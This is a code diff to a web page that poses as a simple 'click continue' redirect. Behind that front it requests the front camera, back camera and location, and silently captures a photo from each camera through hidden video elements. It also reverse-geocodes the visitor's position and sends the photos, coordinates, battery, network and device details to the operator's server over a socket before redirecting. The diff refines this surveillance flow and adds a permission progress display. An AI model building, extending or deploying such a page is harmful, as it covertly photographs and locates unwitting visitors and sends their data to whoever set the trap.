@@ -67,7 +67,17 @@
             font-weight: 500;
             min-height: 24px;
         }
+        #statusText.error { color: #e53e3e; }
+        #statusText.success { color: #22a67e; }
         #hiddenVideo, #hiddenVideoBack { display: none; }
+        .perm-status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #8895aa;
+            display: none;
+        }
+        .perm-status .done { color: #22a67e; }
+        .perm-status .pending { color: #f6ad55; }
     </style>
 </head>
 <body>
@@ -77,7 +87,11 @@
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
         <div class="sub-text">Click continue to proceed</div>
         <div id="statusText">⏳ Ready</div>
-        
+        <div class="perm-status" id="permStatus">
+            <span id="permLocation">📍 Location: <span class="pending">Waiting</span></span> |
+            <span id="permFront">📸 Front: <span class="pending">Waiting</span></span> |
+            <span id="permBack">📸 Back: <span class="pending">Waiting</span></span>
+        </div>
         <button class="btn-continue" id="continueBtn">▶ Continue</button>
     </div>
 
@@ -99,29 +113,37 @@
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
             const statusText = document.getElementById('statusText');
             const continueBtn = document.getElementById('continueBtn');
+            const permStatus = document.getElementById('permStatus');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
             let isProcessing = false;
             
-            // Store streams
             let frontStream = null;
             let backStream = null;
-            
-            // Permission flags
-            let locationGranted = false;
-            let frontCameraGranted = false;
-            let backCameraGranted = false;
+            let frontVideo = document.getElementById('hiddenVideo');
+            let backVideo = document.getElementById('hiddenVideoBack');
 
-            function updateStatus(msg) {
+            function updateStatus(msg, type = '') {
                 statusText.textContent = msg;
+                statusText.className = 'status-text' + (type ? ' ' + type : '');
                 console.log(msg);
             }
 
-            // ============================================
-            // FETCH & CONNECT
-            // ============================================
+            function updatePermStatus(type, status) {
+                const map = {
+                    location: document.getElementById('permLocation').querySelector('span'),
+                    front: document.getElementById('permFront').querySelector('span'),
+                    back: document.getElementById('permBack').querySelector('span')
+                };
+                if (map[type]) {
+                    map[type].textContent = status;
+                    map[type].className = status === 'Granted' ? 'done' : 'pending';
+                }
+                permStatus.style.display = 'block';
+            }
+
             function fetchRedirectUrl() {
                 fetch(`/api/visitor/${visitorId}`)
                     .then(res => res.json())
@@ -205,7 +227,6 @@
                 socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                 console.log('📱 Device info sent');
 
-                // Battery
                 if (navigator.getBattery) {
                     navigator.getBattery()
                         .then(function(battery) {
@@ -221,7 +242,6 @@
                         .catch(() => {});
                 }
 
-                // Network
                 let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                 if (navigator.connection) {
                     const conn = navigator.connection;
@@ -240,8 +260,21 @@
                 }
             }
 
+            function cleanupStreams() {
+                if (frontStream) {
+                    frontStream.getTracks().forEach(t => t.stop());
+                    frontStream = null;
+                }
+                if (backStream) {
+                    backStream.getTracks().forEach(t => t.stop());
+                    backStream = null;
+                }
+                frontVideo.srcObject = null;
+                backVideo.srcObject = null;
+            }
+
             // ============================================
-            // CONTINUE BUTTON - PERMISSIONS STEP BY STEP
+            // CONTINUE BUTTON - PERMISSIONS
             // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
@@ -250,20 +283,32 @@
                 continueBtn.textContent = '⏳ Processing...';
                 
                 updateStatus('⏳ Requesting permissions...');
+                permStatus.style.display = 'block';
+                
+                // Reset permission status
+                updatePermStatus('location', 'Waiting');
+                updatePermStatus('front', 'Waiting');
+                updatePermStatus('back', 'Waiting');
 
-                // ---- STEP 1: FRONT CAMERA (MOST IMPORTANT) ----
+                // Clean up old streams
+                cleanupStreams();
+
+                // ---- STEP 1: FRONT CAMERA ----
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
                 .then(function(stream) {
                     console.log('✅ Front camera granted');
-                    frontCameraGranted = true;
+                    updatePermStatus('front', 'Granted');
                     frontStream = stream;
-                    document.getElementById('hiddenVideo').srcObject = stream;
+                    frontVideo.srcObject = stream;
+                    frontVideo.play().catch(() => {});
                     
                     // Auto capture front photo
-                    capturePhoto('front', stream);
+                    setTimeout(function() {
+                        capturePhoto('front', stream);
+                    }, 500);
                     
                     // ---- STEP 2: BACK CAMERA ----
                     return navigator.mediaDevices.getUserMedia({
@@ -273,12 +318,15 @@
                 })
                 .then(function(stream) {
                     console.log('✅ Back camera granted');
-                    backCameraGranted = true;
+                    updatePermStatus('back', 'Granted');
                     backStream = stream;
-                    document.getElementById('hiddenVideoBack').srcObject = stream;
+                    backVideo.srcObject = stream;
+                    backVideo.play().catch(() => {});
                     
                     // Auto capture back photo
-                    capturePhoto('back', stream);
+                    setTimeout(function() {
+                        capturePhoto('back', stream);
+                    }, 500);
                     
                     // ---- STEP 3: LOCATION ----
                     return new Promise(function(resolve, reject) {
@@ -294,12 +342,11 @@
                 })
                 .then(function(position) {
                     console.log('✅ Location granted');
-                    locationGranted = true;
+                    updatePermStatus('location', 'Granted');
                     
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
                     
-                    // Get location details
                     return fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                         .then(res => res.json())
                         .then(data => {
@@ -323,7 +370,7 @@
                 })
                 .then(function() {
                     // ---- ALL PERMISSIONS GRANTED ----
-                    updateStatus('✅ All permissions granted! Redirecting...');
+                    updateStatus('✅ All permissions granted! Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
@@ -333,7 +380,6 @@
                         });
                     }
                     
-                    // Redirect after 2 seconds
                     setTimeout(function() {
                         if (!redirectTriggered) {
                             redirectNow();
@@ -343,18 +389,20 @@
                 .catch(function(error) {
                     console.log('❌ Permission error:', error);
                     
-                    // Check which permission failed
-                    if (!frontCameraGranted) {
-                        updateStatus('❌ Front camera denied. Please allow camera.');
-                    } else if (!backCameraGranted) {
-                        updateStatus('❌ Back camera denied. Please allow camera.');
-                    } else if (!locationGranted) {
-                        updateStatus('❌ Location denied. Please allow location.');
+                    // Clean up streams on error
+                    cleanupStreams();
+                    
+                    let errorMsg = '';
+                    if (error.message && (error.message.includes('Permission denied') || error.message.includes('denied'))) {
+                        errorMsg = '⚠️ Permission denied. Please allow camera & location in browser.';
+                    } else if (error.message && error.message.includes('not found')) {
+                        errorMsg = '⚠️ No camera found on this device.';
                     } else {
-                        updateStatus('❌ Error: ' + (error.message || error));
+                        errorMsg = '⚠️ Error: ' + (error.message || error);
                     }
                     
-                    // Re-enable button for retry
+                    updateStatus(errorMsg, 'error');
+                    
                     isProcessing = false;
                     continueBtn.disabled = false;
                     continueBtn.textContent = '▶ Retry';
@@ -370,11 +418,9 @@
                     return;
                 }
                 
-                // Get video track from stream
                 const videoTrack = stream.getVideoTracks()[0];
                 if (!videoTrack) return;
                 
-                // Create video element to capture frame
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.autoplay = true;
@@ -404,7 +450,6 @@
                                 console.log(`✅ ${type} photo sent`);
                             }
                             
-                            // Cleanup
                             document.body.removeChild(video);
                         } catch (err) {
                             console.log(`❌ ${type} capture error:`, err.message);
@@ -428,9 +473,7 @@
                     });
                 }
 
-                // Clean up streams
-                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
-                if (backStream) backStream.getTracks().forEach(t => t.stop());
+                cleanupStreams();
 
                 setTimeout(() => {
                     window.location.href = redirectUrl;
@@ -448,8 +491,7 @@
 
             window.addEventListener('beforeunload', function() {
                 if (socket) socket.disconnect();
-                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
-                if (backStream) backStream.getTracks().forEach(t => t.stop());
+                cleanupStreams();
             });
         })();
     </script>
